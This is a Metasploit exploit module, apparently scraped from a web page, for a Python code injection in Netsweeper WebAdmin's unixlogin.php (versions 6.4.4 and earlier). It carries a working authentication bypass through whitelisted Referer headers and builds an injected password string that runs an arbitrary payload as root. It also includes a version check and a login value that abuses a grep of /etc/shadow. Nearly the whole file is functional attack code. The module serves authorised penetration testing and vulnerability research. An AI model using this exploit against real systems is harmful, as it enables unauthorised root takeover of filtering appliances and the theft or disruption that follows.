# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039; => &#039;Netsweeper WebAdmin unixlogin.php Python Code Injection&#039;,
        &#039;Description&#039; => %q{
          This module exploits a Python code injection in the Netsweeper
          WebAdmin component&#039;s unixlogin.php script, for versions 6.4.4 and
          prior, to execute code as the root user.

          Authentication is bypassed by sending a random whitelisted Referer
          header in each request.

          Tested on the CentOS Linux-based Netsweeper 6.4.3 and 6.4.4 ISOs.
          Though the advisory lists 6.4.3 and prior as vulnerable, 6.4.4 has
          been confirmed exploitable.
        },
        &#039;Author&#039; => [
          # Reported to SecuriTeam SSD by an anonymous researcher
          # Reference exploit written by said anonymous researcher
          # Publicly disclosed by Noam Rathaus of SecuriTeam&#039;s SSD
          &#039;wvu&#039; # Module
        ],
        &#039;References&#039; => [
          [&#039;URL&#039;, &#039;https://portswigger.net/daily-swig/severe-rce-vulnerability-in-content-filtering-system-has-been-patched-netsweeper-says&#039;]
        ],
        &#039;DisclosureDate&#039; => &#039;2020-04-28&#039;, # SecuriTeam SSD advisory
        &#039;License&#039; => MSF_LICENSE,
        &#039;Platform&#039; => &#039;python&#039;,
        &#039;Arch&#039; => ARCH_PYTHON,
        &#039;Privileged&#039; => true,
        &#039;Targets&#039; => [[&#039;Python&#039;, {}]],
        &#039;DefaultTarget&#039; => 0,
        &#039;DefaultOptions&#039; => {
          &#039;SSL&#039; => true,
        },
        &#039;Notes&#039; => {
          &#039;NOCVE&#039; => &#039;Publicly disclosed via SecuriTeam SSD advisory&#039;,
          &#039;Stability&#039; => [CRASH_SAFE],
          &#039;Reliability&#039; => [REPEATABLE_SESSION],
          &#039;SideEffects&#039; => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(443),
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path&#039;, &#039;/&#039;])
    ])
  end

  def check
    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path,
                             &#039;/webadmin/tools/systemstatus_remote.php&#039;),
      &#039;headers&#039; => {
        &#039;Referer&#039; => rand_referer(:check) # Auth bypass via Referer header
      }
    )

    unless res
      return CheckCode::Unknown(&#039;Target did not respond to check request.&#039;)
    end

    unless res.code == 200
      return CheckCode::Unknown(&#039;Target is not running Netsweeper.&#039;)
    end

    if res.body.include?(&#039;Permission Denied: Unauthorized access.&#039;)
      return CheckCode::Safe(&#039;Target has rejected our Referer auth bypass.&#039;)
    end

    # Example version information from /webadmin/tools/systemstatus_remote.php:
    #   Version: 6.4.3
    #   Build Date: 2020-03-27 14:15:19
    #   Database Version: 139
    unless (version = res.body.scan(/^Version: ([\d.]+)$/).flatten.first)
      return CheckCode::Detected(
        &#039;Target did not respond with Netsweeper version.&#039;
      )
    end

    if Gem::Version.new(version) <= Gem::Version.new(&#039;6.4.4&#039;)
      return CheckCode::Appears(
        "Netsweeper #{version} is a vulnerable version."
      )
    end

    CheckCode::Safe("Netsweeper #{version} is NOT a vulnerable version.")
  end

  def exploit
    # NOTE: Automatic check is implemented by the AutoCheck mixin
    super

    referer = rand_referer(:exploit)
    vprint_status("Selecting random whitelisted Referer header: #{referer}")
    vprint_status("Injecting Python code into password field: #{fake_password}")

    normie_uri = normalize_uri(target_uri.path, &#039;/webadmin/tools/unixlogin.php&#039;)
    print_status("Sending #{datastore[&#039;PAYLOAD&#039;]} to #{full_uri(normie_uri)}")

    # The application may block on the payload, so time out reasonably soon
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normie_uri,
      &#039;headers&#039; => {
        &#039;Referer&#039; => referer
      },
      &#039;vars_post&#039; => {
        &#039;login&#039; => &#039;.&#039;, # Bypass user check by injecting `grep . /etc/shadow&#039;
        &#039;password&#039; => fake_password
      }
    }, 3.5)

    return unless res

    # An unexpected reply typically means some sort of error, so print it out
    fail_with(Failure::UnexpectedReply, res.body)
  end

  def fake_password
    return @fake_password if @fake_password

    # Arguments for crypt.crypt(): https://docs.python.org/2/library/crypt.html
    word = rand_text_alphanumeric(8..42)
    salt = rand_text_alphanumeric(2) # This is DES-safe because we remove algo

    # Python code injection occurs in the $2 positional parameter from sh(1):
    #   password=$($PYTHON -c "import crypt; print crypt.crypt(&#039;$2&#039;, &#039;\$$algo\$$salt\$&#039;)")
    @fake_password = "#{word}&#039;, &#039;#{salt}&#039;); #{payload.encoded} #"
  end

  # Select a random Referer [sic] header value from an appropriate whitelist
  def rand_referer(method = :check)
    case method
    when :check
      %w[
        webadmin/admin/systemstatus_inc_data.php
        webadmin/api/
        webadmin/common/systemstatus_overview_ajax.php
      ].sample
    when :exploit
      %w[
        systemconfig/edit_database_settings.php
        systemconfig/edit_file.php
        systemconfig/manage_certs.php
        webadmin/admin/service_manager_data.php
        webadmin/api/
        webadmin/systemconfig/edit_email_sending_settings.php
        webadmin/systemconfig/grant_db_access.php
      ].sample
    else
      fail_with(Failure::BadConfig,
                "I don&#039;t know how to #{method}, but I do know how to love")
    end
  end

end

